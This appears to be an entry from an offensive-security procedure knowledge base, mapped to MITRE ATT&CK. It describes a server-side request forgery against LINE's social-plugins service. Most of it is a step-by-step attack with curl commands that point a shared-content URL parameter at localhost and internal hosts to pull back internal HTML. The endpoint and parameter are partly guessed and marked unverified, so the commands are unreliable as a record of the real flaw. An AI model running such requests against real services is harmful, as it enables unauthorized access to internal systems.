---
tags:
  - ssrf
  - dns-bypass
  - line-social-plugins
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-bypass-test]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3631e2e9-5db5-43bf-819b-decfee96986e
created_at: '2025-12-14T04:08:48.517Z'
updated_at: '2025-12-14T04:08:48.517Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-DNS-Verification-for-SSRF-in-LINE-Shared-Content-Parameter

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in the LINE Social Plugins service by bypassing inadequate DNS verification on the parameter used to fetch shared content page information, allowing access to internal HTTP endpoints serving HTML pages.

## Description

The LINE Social Plugins service at social-plugins.line.me processes a parameter (likely a URL query parameter) intended for verifying shared content page details. Due to insufficient DNS validation, attackers can manipulate this parameter to force the server to make HTTP requests to internal resources. This enables retrieval of HTML content from internal web services without authentication, though limited to HTTP protocol and HTML pages. The attack requires crafting requests that evade DNS checks, such as using localhost aliases, internal IP addresses, or controlled domains that resolve internally. Prerequisites include access to the public endpoint and basic HTTP request tools.

## Requirements

1. Public access to https://social-plugins.line.me/
2. Knowledge of the vulnerable parameter (e.g., 'url' in the API endpoint)
3. HTTP client tool like curl for request crafting

## Defense

Defensive measures and detection strategies:

- Implement strict URL whitelisting and DNS rebinding protection
- Validate and sanitize all user-supplied URLs with allowlists for external domains only
- Monitor server logs for unusual internal requests or high-volume fetches to internal endpoints

## Objectives

1. Bypass DNS checks to trigger SSRF
2. Retrieve internal HTML content via server-side requests
3. Assess exposure of internal web services

## Instructions

### Step 1: Identify and Test the Vulnerable Parameter

**Context**: Locate the endpoint handling shared content verification and test with a benign external URL to confirm normal behavior.

**Command** ([[commands/curl-ssrf-bypass-test]]):
```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=https://example.com" -H "User-Agent: Mozilla/5.0 (compatible; SSRF Test)"
```

> This command sends a request to the service with a safe external URL. Expected output is metadata about the shared page without errors, confirming the parameter is processed.

### Step 2: Craft Bypass Payload for Internal Access

**Context**: Modify the URL parameter to target an internal resource, bypassing DNS by using direct internal IPs or localhost equivalents (e.g., 127.0.0.1) since DNS checks are inadequate.

**Command** ([[commands/curl-ssrf-bypass-test]]):
```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=http://127.0.0.1:8080/internal-page" -H "User-Agent: Mozilla/5.0 (compatible; SSRF Test)" -v
```

> This exploits the SSRF by forcing the server to request http://127.0.0.1:8080/internal-page. Expected output includes HTML snippets from the internal service in the response body or headers, indicating successful bypass.

### Step 3: Validate and Analyze Response

**Context**: Check the response for signs of internal content leakage and iterate on payloads if needed (e.g., try other internal ports like 80 or 443 if HTTP).

**Command** ([[commands/curl-ssrf-bypass-test]]):
```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=http://internal-host.internal:80/" -H "User-Agent: Mozilla/5.0 (compatible; SSRF Test)" | grep -i "internal"
```

> Pipe the output through grep to filter for internal indicators. Successful execution shows internal HTML elements or server-specific strings.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-bypass-test]]

## Tools Used


## Tags

- [[ssrf]]
- [[dns-bypass]]
- [[web-exploitation]]
